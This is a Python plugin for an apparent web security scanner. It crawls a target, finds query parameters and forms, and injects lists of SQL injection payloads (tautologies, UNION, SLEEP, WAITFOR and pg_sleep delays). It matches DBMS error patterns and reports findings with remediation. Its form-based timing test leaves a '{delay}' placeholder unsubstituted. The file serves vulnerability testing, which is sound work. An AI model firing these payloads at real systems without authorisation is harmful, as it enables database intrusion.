"""SQL Injection scanner plugin.

Tests URL parameters for SQL injection vulnerabilities using
error-based and time-based blind detection techniques.
"""

import logging
import re
import time
from difflib import SequenceMatcher
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import httpx

from nightowl.core.plugin_base import ScannerPlugin
from nightowl.models.finding import Finding, FindingState, Severity
from nightowl.models.target import Target
from nightowl.utils.web_discovery import discover_web_attack_surface, form_to_legacy_dict

logger = logging.getLogger("nightowl")

# Error patterns by DBMS
SQL_ERROR_PATTERNS: dict[str, list[str]] = {
    "HSQLDB": [
        "unexpected token:",
        "malformed string:",
        "org.owasp.webgoat.lessons.sqlinjection",
        "org.hsqldb",
    ],
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "unclosed quotation mark after the character string",
        "mysql_num_rows()",
        "mysql_fetch_array()",
        "supplied argument is not a valid mysql",
        "com.mysql.jdbc",
    ],
    "PostgreSQL": [
        "pg_query()",
        "pg_exec()",
        "unterminated quoted string",
        "syntax error at or near",
        "invalid input syntax for",
        "current transaction is aborted",
        "org.postgresql.util.psqlexception",
    ],
    "SQLite": [
        "sqlite3.operationalerror",
        "sqlite_error",
        "unrecognized token",
        "near \".\":",
        "near \"(\": syntax error",
        "sqlite3::exception",
    ],
    "MSSQL": [
        "microsoft ole db provider for sql server",
        "unclosed quotation mark after the character string",
        "incorrect syntax near",
        "[microsoft][odbc sql server driver]",
        "mssql_query()",
        "microsoft sql native client error",
        "sqlserver jdbc driver",
    ],
    "Oracle": [
        "ora-01756",
        "ora-00933",
        "oracle error",
        "quoted string not properly terminated",
        "sql command not properly ended",
    ],
}

# Payloads for error-based detection
ERROR_PAYLOADS: list[str] = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1;SELECT * FROM information_schema.tables--",
]

# Payloads for time-based blind detection
TIME_PAYLOADS: list[dict] = [
    {
        "payload": "' OR SLEEP({delay})-- ",
        "dbms": "MySQL",
        "delay": 3,
    },
    {
        "payload": "'; WAITFOR DELAY '0:0:{delay}'--",
        "dbms": "MSSQL",
        "delay": 3,
    },
    {
        "payload": "' OR pg_sleep({delay})--",
        "dbms": "PostgreSQL",
        "delay": 3,
    },
    {
        "payload": "1' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- ",
        "dbms": "MySQL",
        "delay": 3,
    },
    {
        "payload": "'; SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END--",
        "dbms": "PostgreSQL",
        "delay": 3,
    },
]

# Payloads for boolean-based blind detection (true/false pairs)
BOOLEAN_PAYLOADS: list[dict] = [
    {
        "true_payload": "' OR '1'='1'-- ",
        "false_payload": "' OR '1'='2'-- ",
        "dbms": "Generic",
    },
    {
        "true_payload": "' OR 1=1-- ",
        "false_payload": "' OR 1=2-- ",
        "dbms": "Generic",
    },
    {
        "true_payload": "1 OR 1=1",
        "false_payload": "1 OR 1=2",
        "dbms": "Generic",
    },
    {
        "true_payload": "1' OR '1'='1",
        "false_payload": "1' OR '1'='2",
        "dbms": "Generic",
    },
]


class SQLiScannerPlugin(ScannerPlugin):
    """Tests URL parameters for SQL injection vulnerabilities."""

    name = "sqli-scanner"
    description = "Error-based and time-based blind SQL injection detection"
    version = "1.0.0"
    stage = "scan"
    config_schema = {
        "discovery_depth": (int, 1),
        "discovery_max_pages": (int, 6),
        "discovery_max_urls": (int, 10),
        "discovery_max_forms": (int, 10),
    }

    def __init__(self, config: dict | None = None):
        super().__init__(config)
        self.time_threshold: float = self.config.get("time_threshold", 2.5)
        self.time_delay: int = self.config.get("time_delay", 3)
        self.max_params: int = self.config.get("max_params", 20)
        self.error_payloads: list[str] = self.config.get("error_payloads", ERROR_PAYLOADS)
        self.time_payloads: list[dict] = self.config.get("time_payloads", TIME_PAYLOADS)
        self.boolean_payloads: list[dict] = self.config.get("boolean_payloads", BOOLEAN_PAYLOADS)
        self.boolean_diff_threshold: float = self.config.get("boolean_diff_threshold", 0.15)

    def _resolve_url(self, target: Target) -> str:
        if target.url:
            return target.url
        scheme = "https" if target.port in (443, 8443) else "http"
        port_part = "" if target.port in (80, 443, None) else f":{target.port}"
        host = target.domain or target.ip or target.host
        return f"{scheme}://{host}{port_part}"

    def _extract_params(self, url: str) -> dict[str, list[str]]:
        """Extract query parameters from a URL."""
        parsed = urlparse(url)
        return parse_qs(parsed.query)

    @staticmethod
    def _default_form_value(param_name: str) -> str:
        lowered = param_name.lower()
        if lowered in {"id", "userid", "login_count", "auth_tan", "query"}:
            return "1"
        if lowered in {"name", "username"}:
            return "test"
        if lowered in {"action_string"}:
            return "SELECT 1"
        return "test"

    def _extract_form_targets(self, html: str, base_url: str) -> list[dict]:
        """Extract simple GET/POST forms and their fields from an HTML page."""
        form_targets: list[dict] = []
        form_pattern = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
        attr_pattern = re.compile(r"([a-zA-Z_:][-a-zA-Z0-9_:]*)=(['\"])(.*?)\2", re.S)
        input_pattern = re.compile(r"<input\b([^>]*)>", re.I | re.S)

        for form_match in form_pattern.finditer(html):
            raw_form_attrs = {
                key.lower(): value for key, _, value in attr_pattern.findall(form_match.group(1))
            }
            method = raw_form_attrs.get("method", "get").lower()
            if method not in {"get", "post"}:
                continue
            action = raw_form_attrs.get("action", "").strip()
            action_url = urljoin(base_url, action) if action else base_url

            params: dict[str, str] = {}
            attackable_params: list[str] = []
            for input_match in input_pattern.finditer(form_match.group(2)):
                attrs = {
                    key.lower(): value for key, _, value in attr_pattern.findall(input_match.group(1))
                }
                name = attrs.get("name", "").strip()
                if not name:
                    continue
                input_type = attrs.get("type", "text").lower()
                if input_type in {"submit", "button", "reset", "image", "file"}:
                    continue
                params[name] = attrs.get("value", "") or self._default_form_value(name)
                if input_type not in {"hidden", "checkbox", "radio"} and " " not in name:
                    attackable_params.append(name)

            if attackable_params:
                form_targets.append(
                    {
                        "method": method,
                        "url": action_url,
                        "params": params,
                        "attackable_params": attackable_params[: self.max_params],
                    }
                )

        return form_targets

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replace a single query parameter value with a payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        flat = {k: v[0] for k, v in params.items()}
        new_query = urlencode(flat)
        return urlunparse(parsed._replace(query=new_query))

    def _check_error_patterns(self, body: str) -> tuple[str, str] | None:
        """Check response body for SQL error messages. Returns (dbms, matched_pattern)."""
        body_lower = body.lower()
        for dbms, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern in body_lower:
                    return dbms, pattern
        return None

    @staticmethod
    def _timing_signal_is_strong(
        baseline_time: float,
        elapsed: float,
        expected_delay: int,
        threshold: float,
    ) -> bool:
        if baseline_time > threshold:
            return False
        if elapsed < (expected_delay - 1):
            return False
        return elapsed > (baseline_time + threshold)

    @staticmethod
    def _response_similarity(body_a: str, body_b: str) -> float:
        """Return a similarity ratio (0.0-1.0) between two response bodies."""
        if not body_a and not body_b:
            return 1.0
        return SequenceMatcher(None, body_a[:4096], body_b[:4096]).ratio()

    async def _test_boolean_based(
        self, client: httpx.AsyncClient, url: str, param: str
    ) -> list[Finding]:
        """Test a parameter for boolean-based blind SQL injection."""
        findings: list[Finding] = []

        # Get baseline response (original value)
        try:
            baseline_resp = await client.get(url, headers=self.get_request_headers())
            baseline_body = baseline_resp.text
        except httpx.RequestError:
            return findings

        for bpayload in self.boolean_payloads:
            true_url = self._inject_param(url, param, bpayload["true_payload"])
            false_url = self._inject_param(url, param, bpayload["false_payload"])

            try:
                true_resp = await client.get(true_url, headers=self.get_request_headers())
                await self.wait_request_delay()
                false_resp = await client.get(false_url, headers=self.get_request_headers())

                # If true and false responses are significantly different,
                # and true response is similar to baseline — likely injectable
                true_sim = self._response_similarity(baseline_body, true_resp.text)
                false_sim = self._response_similarity(baseline_body, false_resp.text)
                diff = true_sim - false_sim

                if diff > self.boolean_diff_threshold and true_sim > 0.8:
                    # Verify with a second true/false pair to reduce FPs
                    verify_true = await client.get(true_url, headers=self.get_request_headers())
                    await self.wait_request_delay()
                    verify_false = await client.get(false_url, headers=self.get_request_headers())

                    verify_true_sim = self._response_similarity(baseline_body, verify_true.text)
                    verify_false_sim = self._response_similarity(baseline_body, verify_false.text)
                    verify_diff = verify_true_sim - verify_false_sim

                    if verify_diff > self.boolean_diff_threshold:
                        findings.append(
                            Finding(
                                title=f"SQL Injection (Boolean-Based Blind) in '{param}'",
                                description=(
                                    f"The parameter '{param}' appears vulnerable to "
                                    f"boolean-based blind SQL injection. The server "
                                    f"returns different responses for true vs false conditions."
                                ),
                                severity=Severity.HIGH,
                                finding_state=FindingState.SUSPECTED,
                                confidence_score=0.85,
                                cvss_score=8.6,
                                category="sql-injection",
                                evidence=(
                                    f"URL: {url}\n"
                                    f"True payload: {bpayload['true_payload']}\n"
                                    f"False payload: {bpayload['false_payload']}\n"
                                    f"True similarity to baseline: {true_sim:.2f}\n"
                                    f"False similarity to baseline: {false_sim:.2f}\n"
                                    f"Difference: {diff:.2f} (threshold: {self.boolean_diff_threshold})\n"
                                    f"Verified: yes (diff={verify_diff:.2f})"
                                ),
                                remediation=(
                                    "Use parameterized queries (prepared statements) for all "
                                    "database interactions. Never concatenate user input into "
                                    "SQL strings. Apply input validation and use an ORM where possible."
                                ),
                                references=[
                                    "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                                ],
                                metadata={
                                    "param": param,
                                    "true_payload": bpayload["true_payload"],
                                    "false_payload": bpayload["false_payload"],
                                    "technique": "boolean-based-blind",
                                    "true_similarity": round(true_sim, 3),
                                    "false_similarity": round(false_sim, 3),
                                },
                            )
                        )
                        return findings

            except httpx.RequestError as exc:
                logger.debug(f"[sqli-scanner] Boolean-based request failed: {exc}")
                continue
            await self.wait_request_delay()

        return findings

    async def _send_request(
        self,
        client: httpx.AsyncClient,
        method: str,
        url: str,
        params: dict[str, str],
        *,
        timeout: float | None = None,
    ) -> httpx.Response:
        if method == "post":
            return await client.post(
                url,
                data=params,
                headers=self.get_request_headers(),
                timeout=timeout or self.timeout,
            )
        return await client.get(
            url,
            params=params,
            headers=self.get_request_headers(),
            timeout=timeout or self.timeout,
        )

    async def _test_error_based(
        self, client: httpx.AsyncClient, url: str, param: str
    ) -> list[Finding]:
        """Test a parameter for error-based SQL injection."""
        findings: list[Finding] = []

        # Get baseline response to avoid false positives
        try:
            baseline = await client.get(url, headers=self.get_request_headers())
            baseline_errors = self._check_error_patterns(baseline.text)
        except httpx.RequestError:
            return findings

        # If the baseline already contains SQL errors, skip (noisy target)
        if baseline_errors:
            logger.debug(
                f"[sqli-scanner] Baseline already has SQL errors for {param}, skipping error-based"
            )
            return findings

        for payload in self.error_payloads:
            injected_url = self._inject_param(url, param, payload)
            try:
                response = await client.get(
                    injected_url, headers=self.get_request_headers()
                )
                match = self._check_error_patterns(response.text)
                if match:
                    dbms, pattern = match
                    findings.append(
                        Finding(
                            title=f"SQL Injection (Error-Based) in '{param}'",
                            description=(
                                f"The parameter '{param}' appears vulnerable to "
                                f"error-based SQL injection. A {dbms} error message "
                                f"was returned when injecting a crafted payload."
                            ),
                            severity=Severity.HIGH,
                            finding_state=FindingState.CONFIRMED,
                            confidence_score=0.97,
                            cvss_score=8.6,
                            category="sql-injection",
                            evidence=(
                                f"URL: {injected_url}\n"
                                f"Payload: {payload}\n"
                                f"DBMS: {dbms}\n"
                                f"Error pattern: {pattern}\n"
                                f"Status: {response.status_code}"
                            ),
                            remediation=(
                                "Use parameterized queries (prepared statements) for all "
                                "database interactions. Never concatenate user input into "
                                "SQL strings. Apply input validation and use an ORM where possible."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                            ],
                            metadata={
                                "param": param,
                                "payload": payload,
                                "dbms": dbms,
                                "technique": "error-based",
                            },
                        )
                    )
                    # One confirmed finding per parameter is sufficient
                    return findings

            except httpx.RequestError as exc:
                logger.debug(f"[sqli-scanner] Error-based request failed: {exc}")
                continue
            await self.wait_request_delay()

        return findings

    async def _test_time_based(
        self, client: httpx.AsyncClient, url: str, param: str
    ) -> list[Finding]:
        """Test a parameter for time-based blind SQL injection."""
        findings: list[Finding] = []

        # Measure baseline response time
        try:
            start = time.monotonic()
            await client.get(url, headers=self.get_request_headers())
            baseline_time = time.monotonic() - start
        except httpx.RequestError:
            return findings

        for tpayload in self.time_payloads:
            delay = self.time_delay
            payload = tpayload["payload"].replace("{delay}", str(delay))
            expected_delay = delay
            dbms = tpayload["dbms"]

            injected_url = self._inject_param(url, param, payload)
            try:
                start = time.monotonic()
                response = await client.get(
                    injected_url,
                    headers=self.get_request_headers(),
                    timeout=max(self.timeout, expected_delay + 10),
                )
                elapsed = time.monotonic() - start

                if self._timing_signal_is_strong(
                    baseline_time, elapsed, expected_delay, self.time_threshold
                ):
                    # Verification round: re-send to confirm it wasn't network jitter
                    verify_start = time.monotonic()
                    await client.get(
                        injected_url,
                        headers=self.get_request_headers(),
                        timeout=max(self.timeout, expected_delay + 10),
                    )
                    verify_elapsed = time.monotonic() - verify_start

                    if not self._timing_signal_is_strong(
                        baseline_time, verify_elapsed, expected_delay, self.time_threshold
                    ):
                        logger.debug(
                            f"[sqli-scanner] Time-based verification failed for {param}, "
                            f"first={elapsed:.2f}s verify={verify_elapsed:.2f}s — skipping"
                        )
                        continue

                    findings.append(
                        Finding(
                            title=f"SQL Injection (Time-Based Blind) in '{param}'",
                            description=(
                                f"The parameter '{param}' appears vulnerable to "
                                f"time-based blind SQL injection. A {dbms} time-delay "
                                f"payload caused the server to respond {elapsed:.1f}s "
                                f"later than the baseline ({baseline_time:.1f}s). "
                                f"Verified with a second request ({verify_elapsed:.1f}s)."
                            ),
                            severity=Severity.CRITICAL,
                            finding_state=FindingState.SUSPECTED,
                            confidence_score=0.88,
                            cvss_score=9.8,
                            category="sql-injection",
                            evidence=(
                                f"URL: {injected_url}\n"
                                f"Payload: {payload}\n"
                                f"DBMS: {dbms}\n"
                                f"Baseline time: {baseline_time:.2f}s\n"
                                f"Injected time: {elapsed:.2f}s\n"
                                f"Verification time: {verify_elapsed:.2f}s\n"
                                f"Expected delay: {expected_delay}s\n"
                                f"Status: {response.status_code}"
                            ),
                            remediation=(
                                "Use parameterized queries (prepared statements) for all "
                                "database interactions. Never concatenate user input into "
                                "SQL strings. Apply input validation and use an ORM where possible."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                            ],
                            metadata={
                                "param": param,
                                "payload": payload,
                                "dbms": dbms,
                                "technique": "time-based-blind",
                                "baseline_time": round(baseline_time, 2),
                                "injected_time": round(elapsed, 2),
                                "verification_time": round(verify_elapsed, 2),
                            },
                        )
                    )
                    return findings

            except httpx.ReadTimeout:
                findings.append(
                    Finding(
                        title=f"SQL Injection (Time-Based Blind) in '{param}'",
                        description=(
                            f"The parameter '{param}' may be vulnerable to "
                            f"time-based blind SQL injection. A {dbms} time-delay "
                            f"payload caused the request to time out, suggesting "
                            f"the injected query was executed."
                        ),
                        severity=Severity.HIGH,
                        finding_state=FindingState.SUSPECTED,
                        confidence_score=0.75,
                        cvss_score=8.6,
                        category="sql-injection",
                        evidence=(
                            f"URL: {injected_url}\n"
                            f"Payload: {payload}\n"
                            f"DBMS: {dbms}\n"
                            f"Result: Request timed out (>{self.timeout}s)"
                        ),
                        remediation=(
                            "Use parameterized queries (prepared statements) for all "
                            "database interactions. Never concatenate user input into "
                            "SQL strings."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        ],
                        metadata={
                            "param": param,
                            "payload": payload,
                            "dbms": dbms,
                            "technique": "time-based-blind",
                            "result": "timeout",
                        },
                    )
                )
                return findings

            except httpx.RequestError as exc:
                logger.debug(f"[sqli-scanner] Time-based request failed: {exc}")
                continue
            await self.wait_request_delay()

        return findings

    async def _test_error_based_form(
        self,
        client: httpx.AsyncClient,
        method: str,
        action_url: str,
        params: dict[str, str],
        param: str,
    ) -> list[Finding]:
        findings: list[Finding] = []
        try:
            baseline = await self._send_request(client, method, action_url, params)
            baseline_errors = self._check_error_patterns(baseline.text)
        except httpx.RequestError:
            return findings

        if baseline_errors:
            logger.debug(
                f"[sqli-scanner] Baseline already has SQL errors for form param {param}, skipping"
            )
            return findings

        for payload in self.error_payloads:
            injected_params = dict(params)
            injected_params[param] = payload
            try:
                response = await self._send_request(client, method, action_url, injected_params)
                match = self._check_error_patterns(response.text)
                if match:
                    dbms, pattern = match
                    findings.append(
                        Finding(
                            title=f"SQL Injection (Error-Based) in '{param}'",
                            description=(
                                f"The parameter '{param}' appears vulnerable to error-based SQL injection "
                                f"through a {method.upper()} form submission. A {dbms} error message was returned."
                            ),
                            severity=Severity.HIGH,
                            finding_state=FindingState.CONFIRMED,
                            confidence_score=0.97,
                            cvss_score=8.6,
                            category="sql-injection",
                            evidence=(
                                f"Method: {method.upper()}\n"
                                f"Action: {action_url}\n"
                                f"Payload: {payload}\n"
                                f"DBMS: {dbms}\n"
                                f"Error pattern: {pattern}\n"
                                f"Status: {response.status_code}"
                            ),
                            remediation=(
                                "Use parameterized queries (prepared statements) for all "
                                "database interactions. Never concatenate user input into "
                                "SQL strings. Apply input validation and use an ORM where possible."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                            ],
                            metadata={
                                "param": param,
                                "payload": payload,
                                "dbms": dbms,
                                "technique": "error-based",
                                "request_method": method.upper(),
                                "action_url": action_url,
                            },
                        )
                    )
                    return findings
            except httpx.RequestError as exc:
                logger.debug(f"[sqli-scanner] Error-based form request failed: {exc}")
                continue
            await self.wait_request_delay()

        return findings

    async def _test_time_based_form(
        self,
        client: httpx.AsyncClient,
        method: str,
        action_url: str,
        params: dict[str, str],
        param: str,
    ) -> list[Finding]:
        findings: list[Finding] = []
        try:
            start = time.monotonic()
            await self._send_request(client, method, action_url, params)
            baseline_time = time.monotonic() - start
        except httpx.RequestError:
            return findings

        for tpayload in self.time_payloads:
            payload = tpayload["payload"]
            expected_delay = tpayload["delay"]
            dbms = tpayload["dbms"]
            injected_params = dict(params)
            injected_params[param] = payload
            try:
                start = time.monotonic()
                response = await self._send_request(
                    client,
                    method,
                    action_url,
                    injected_params,
                    timeout=max(self.timeout, expected_delay + 10),
                )
                elapsed = time.monotonic() - start
                if self._timing_signal_is_strong(
                    baseline_time, elapsed, expected_delay, self.time_threshold
                ):
                    findings.append(
                        Finding(
                            title=f"SQL Injection (Time-Based Blind) in '{param}'",
                            description=(
                                f"The parameter '{param}' appears vulnerable to time-based blind SQL injection "
                                f"through a {method.upper()} form submission."
                            ),
                            severity=Severity.CRITICAL,
                            finding_state=FindingState.SUSPECTED,
                            confidence_score=0.82,
                            cvss_score=9.8,
                            category="sql-injection",
                            evidence=(
                                f"Method: {method.upper()}\n"
                                f"Action: {action_url}\n"
                                f"Payload: {payload}\n"
                                f"DBMS: {dbms}\n"
                                f"Baseline time: {baseline_time:.2f}s\n"
                                f"Injected time: {elapsed:.2f}s\n"
                                f"Expected delay: {expected_delay}s\n"
                                f"Status: {response.status_code}"
                            ),
                            remediation=(
                                "Use parameterized queries (prepared statements) for all "
                                "database interactions. Never concatenate user input into "
                                "SQL strings. Apply input validation and use an ORM where possible."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                            ],
                            metadata={
                                "param": param,
                                "payload": payload,
                                "dbms": dbms,
                                "technique": "time-based-blind",
                                "baseline_time": round(baseline_time, 2),
                                "injected_time": round(elapsed, 2),
                                "request_method": method.upper(),
                                "action_url": action_url,
                            },
                        )
                    )
                    return findings
            except httpx.ReadTimeout:
                findings.append(
                    Finding(
                        title=f"SQL Injection (Time-Based Blind) in '{param}'",
                        description=(
                            f"The parameter '{param}' may be vulnerable to time-based blind SQL injection "
                            f"through a {method.upper()} form submission."
                        ),
                        severity=Severity.HIGH,
                        finding_state=FindingState.SUSPECTED,
                        confidence_score=0.75,
                        cvss_score=8.6,
                        category="sql-injection",
                        evidence=(
                            f"Method: {method.upper()}\n"
                            f"Action: {action_url}\n"
                            f"Payload: {payload}\n"
                            f"DBMS: {dbms}\n"
                            f"Result: Request timed out (>{self.timeout}s)"
                        ),
                        remediation=(
                            "Use parameterized queries (prepared statements) for all "
                            "database interactions. Never concatenate user input into "
                            "SQL strings."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        ],
                        metadata={
                            "param": param,
                            "payload": payload,
                            "dbms": dbms,
                            "technique": "time-based-blind",
                            "result": "timeout",
                            "request_method": method.upper(),
                            "action_url": action_url,
                        },
                    )
                )
                return findings
            except httpx.RequestError as exc:
                logger.debug(f"[sqli-scanner] Time-based form request failed: {exc}")
                continue
            await self.wait_request_delay()

        return findings

    async def run(self, target: Target, **kwargs) -> list[Finding]:
        findings: list[Finding] = []
        url = self._resolve_url(target)

        async with self.create_http_client() as client:
            await self.bootstrap_auth(client)
            try:
                page_response = await client.get(url, headers=self.get_request_headers())
            except httpx.RequestError:
                page_response = None

            discovery = None
            candidate_urls = [url]
            form_targets: list[dict] = []
            if page_response is not None:
                discovery = await discover_web_attack_surface(
                    client,
                    str(page_response.url),
                    default_value_fn=self._default_form_value,
                    max_depth=self.config.get("discovery_depth", 1),
                    max_pages=self.config.get("discovery_max_pages", 6),
                    max_urls_with_params=self.config.get("discovery_max_urls", 10),
                    max_forms=self.config.get("discovery_max_forms", 10),
                    request_headers=self.get_request_headers(),
                    wait_hook=self.wait_request_delay,
                )
                for discovered_url in discovery.urls_with_params:
                    if discovered_url not in candidate_urls:
                        candidate_urls.append(discovered_url)
                form_targets.extend(self._extract_form_targets(page_response.text, str(page_response.url)))
                seen_forms = {
                    (
                        form["method"],
                        form["url"],
                        tuple(sorted(form["attackable_params"])),
                    )
                    for form in form_targets
                }
                for discovered_form in discovery.forms:
                    legacy_form = form_to_legacy_dict(discovered_form)
                    form_key = (
                        legacy_form["method"],
                        legacy_form["url"],
                        tuple(sorted(legacy_form["attackable_params"])),
                    )
                    if form_key in seen_forms:
                        continue
                    seen_forms.add(form_key)
                    form_targets.append(legacy_form)

            tested_any_param = False
            for candidate_url in candidate_urls:
                params = self._extract_params(candidate_url)
                param_names = list(params.keys())[: self.max_params]
                if not param_names:
                    continue
                tested_any_param = True
                logger.info(
                    f"[sqli-scanner] Testing {len(param_names)} query parameter(s) on {candidate_url}"
                )
                for param in param_names:
                    error_findings = await self._test_error_based(client, candidate_url, param)
                    findings.extend(error_findings)
                    boolean_findings: list[Finding] = []
                    if not error_findings:
                        boolean_findings = await self._test_boolean_based(client, candidate_url, param)
                        findings.extend(boolean_findings)
                    if not error_findings and not boolean_findings:
                        time_findings = await self._test_time_based(client, candidate_url, param)
                        findings.extend(time_findings)
            if not tested_any_param and not form_targets:
                logger.info(f"[sqli-scanner] No query parameters or simple forms found in {url}")
                return findings

            for form_target in form_targets:
                for param in form_target["attackable_params"]:
                    error_findings = await self._test_error_based_form(
                        client,
                        form_target["method"],
                        form_target["url"],
                        form_target["params"],
                        param,
                    )
                    findings.extend(error_findings)
                    if not error_findings:
                        time_findings = await self._test_time_based_form(
                            client,
                            form_target["method"],
                            form_target["url"],
                            form_target["params"],
                            param,
                        )
                        findings.extend(time_findings)

        return findings
